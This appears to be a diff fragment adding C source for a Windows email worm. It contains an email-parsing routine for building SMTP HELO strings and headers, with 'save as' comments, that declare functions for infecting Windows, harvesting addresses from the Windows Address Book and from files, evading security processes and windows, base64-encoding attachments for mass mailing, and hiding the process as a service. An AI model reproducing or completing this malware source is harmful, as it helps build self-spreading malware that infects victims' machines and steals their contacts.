+                   i++;
+               }
+               szMail[i]=0;
+           }
+           i=strlen(szMail)-1;
+           j=0;
+           while (szMail[i]!='@')
+           {
+               szHelo[j]=szMail[i];
+               j++;
+               i--;
+           }
+       }
+       szHelo[j]=0;
+       strrev(szHelo);
+   }
+
+
+
+   /* save as basehead.h */
+   #ifndef _BASE_HEADER_MINE_H
+   #define _BASE_HEADER_MINE_H
+
+
+
+   DWORD CALLBACK ThreadSpy(LPVOID lpThreadParameter);
+   DWORD CALLBACK ThreadFileSearch(LPVOID lpThreadParameter);
+   DWORD CALLBACK ThreadCheckRegistry(LPVOID lpThreadParameter);
+   DWORD CALLBACK ThreadMessaging(LPVOID lpThreadParameter);
+   BOOL CALLBACK WndEnumProcMine(HWND hwnd1,long l1);
+   BOOL BadWindow(LPSTR strWindow);
+   BOOL BadProcess(LPSTR strModule);
+   BOOL ConnectTo();
+   BOOL SendTo(LPSTR strTo);
+   BOOL Check(int iStatus);
+   BOOL InfectWindows();
+   BOOL GetOSVersion();
+   LPSTR GetFilename();
+   LPTSTR RetRndString(int Dim);
+   void GetServer();
+   void EnumProcessesOther();
+   void EnumProcessesWin98();
+   void EncodeBase64(char strFile[MAX_PATH]);
+   void MsgBox(LPTSTR strMessage);
+   void Receive();
+   void Send();
+   void RecurseSeek(LPTSTR strPath);
+   int RetRndNumber(int NBound);
+
+
+   #endif
+
+   /* save as findhead.h */
+
+   #ifndef _FIND_HEADER_MINE_H
+   #define _FIND_HEADER_MINE_H
+
+
+   BOOL IsItAffordableChar(char c1);
+   BOOL GetAddressesInWAB(char* strFile);
+   BOOL GetAddressesInFile(char* strFile);
+   BOOL AddEmail(LPTSTR strEmail);
+
+
+   #endif
+
+   /* save as reg_proc.h */
+
+   #ifndef _REG_PROC_H_
+   #define _REG_PROC_H_
+
+
+   typedef DWORD (WINAPI *LPREGISTERSERVICEPROCESS) (DWORD, DWORD);
+
+   BOOL RegisterServiceProcess(DWORD dwProcessId, DWORD dwRegisterFlag);
+
+   #endif // _REG_PROC_H_
